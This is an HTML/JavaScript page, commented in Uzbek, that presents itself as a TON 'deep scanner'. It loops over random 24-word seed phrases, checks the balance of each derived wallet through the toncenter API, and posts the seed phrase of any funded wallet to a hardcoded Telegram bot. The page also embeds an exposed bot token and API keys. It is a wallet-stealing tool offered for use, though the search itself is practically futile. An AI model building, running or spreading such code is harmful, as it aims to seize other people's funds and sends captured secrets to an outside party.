<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <title>TON MASTER SCANNER v5.0 (ULTIMATE)</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/tonweb@0.0.66/dist/tonweb.bundle.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tonweb-mnemonic@0.0.6/dist/tonweb-mnemonic.js"></script>
</head>
<body class="bg-[#050505] text-white font-mono min-h-screen flex flex-col items-center justify-center p-4">

    <div class="max-w-2xl w-full bg-[#111] p-6 rounded-3xl border border-blue-500/30 shadow-2xl shadow-blue-900/20">
        <div class="text-center mb-6">
            <h1 class="text-2xl font-black text-blue-500 italic uppercase tracking-tighter">TON MASTER SCANNER v5.0</h1>
            <p class="text-[10px] text-green-500 tracking-widest animate-pulse">SYSTEM STATUS: READY TO SCAN</p>
        </div>

        <div id="terminal" class="bg-black/90 rounded-2xl p-4 h-80 overflow-y-auto mb-6 text-[11px] border border-slate-800 scrollbar-hide">
            <p class="text-blue-400 font-bold">> Tizim yuklanmoqda...</p>
        </div>

        <div class="space-y-3">
            <button id="startBtn" onclick="forceStart()" class="w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-black text-lg shadow-lg shadow-blue-900/40 transition-all active:scale-95">
                START DEEP SCANNING
            </button>
            <button id="stopBtn" onclick="location.reload()" class="w-full bg-red-600/20 text-red-500 py-4 rounded-2xl font-bold hidden">
                STOP SCANNING
            </button>
        </div>
    </div>

    <script>
        // Telegram sozlamalari (O'zingiznikini qo'ying)
        const TELEGRAM_BOT_TOKEN = '8557227217:AAGTTWhdIfQUfYE-98Kfn61ZWndpH3Ng5Nw'; 
        const TELEGRAM_CHAT_ID = '7921132456'; 
        
        const API_KEYS = [
            'cdef18c228c4a4d63ead8a723cbf910e0385e52829df0e62300b3f859142271a',
            'b9e1cd205b86ebbd57238da87fdfef86a408d0abea6a81b768177ad2b9edfdff'
        ];

        let isRunning = false;
        let bip39Words = [];
        const tonweb = new TonWeb();

        function addLog(msg, color = 'text-slate-500') {
            const p = document.createElement('p');
            p.className = `mb-1 ${color}`;
            p.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            const term = document.getElementById('terminal');
            term.prepend(p);
            if (term.childNodes.length > 100) term.lastChild.remove();
        }

        // Lug'atni yuklashning eng barqaror usuli
        async function loadDictionary() {
            addLog("Lug'at yuklanmoqda...", "text-yellow-500");
            try {
                const response = await fetch('https://cdn.jsdelivr.net/gh/bitcoin/bips@master/bip-0039/english.txt');
                const data = await response.text();
                bip39Words = data.split('\n').map(w => w.trim()).filter(w => w.length > 0);
                if(bip39Words.length > 2000) {
                    addLog("✅ Lug'at muvaffaqiyatli yuklandi. 2048 so'z tayyor.", "text-green-500");
                }
            } catch (e) {
                addLog("❌ Lug'at yuklashda xato! Sahifani yangilang yoki VPN tekshiring.", "text-red-500");
            }
        }
        loadDictionary();

        async function forceStart() {
            if (bip39Words.length === 0) {
                addLog("Xato: Lug'at hali tayyor emas!", "text-red-500");
                return;
            }
            isRunning = true;
            document.getElementById('startBtn').classList.add('hidden');
            document.getElementById('stopBtn').classList.remove('hidden');
            addLog("SKANERLASH BOSHLANDI. REAL-TIME DATA CHECK...", "text-blue-500 font-bold");
            scan();
        }

        async function scan() {
            if (!isRunning) return;

            try {
                // 24 talik seed fraza yaratish
                let mnemonic = [];
                for(let i=0; i<24; i++) {
                    mnemonic.push(bip39Words[Math.floor(Math.random() * bip39Words.length)]);
                }

                if (window.tonMnemonic) {
                    const keyPair = await window.tonMnemonic.mnemonicToKeyPair(mnemonic);
                    const wallet = new tonweb.wallet.all.v4R2(tonweb.provider, { publicKey: keyPair.publicKey });
                    const address = await wallet.getAddress();
                    const addrStr = address.toString(true, true, true);

                    // API orqali tekshirish
                    const key = API_KEYS[Math.floor(Math.random() * API_KEYS.length)];
                    const res = await fetch(`https://toncenter.com/api/v2/getAddressInformation?address=${addrStr}&api_key=${key}`);
                    const data = await res.json();

                    if (data.ok && parseInt(data.result.balance) > 0) {
                        // AGAR PUL TOPILSA!
                        addLog(`💎 TOPILDI!!! ADDR: ${addrStr}`, "text-green-400 font-bold");
                        const msg = `💎 TON TOPILDI!\n\nAddr: ${addrStr}\nPhrase: ${mnemonic.join(' ')}`;
                        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);
                    } else {
                        addLog(`Bo'sh: ${addrStr.substring(0,15)}...`, "text-slate-600 text-[10px]");
                    }
                }
            } catch (e) {
                addLog("API Limit yoki ulanish xatosi...", "text-red-800");
            }

            // Tezlikni optimallashtirish (API bloklamasligi uchun)
            setTimeout(scan, 800);
        }
    </script>
</body>
</html>
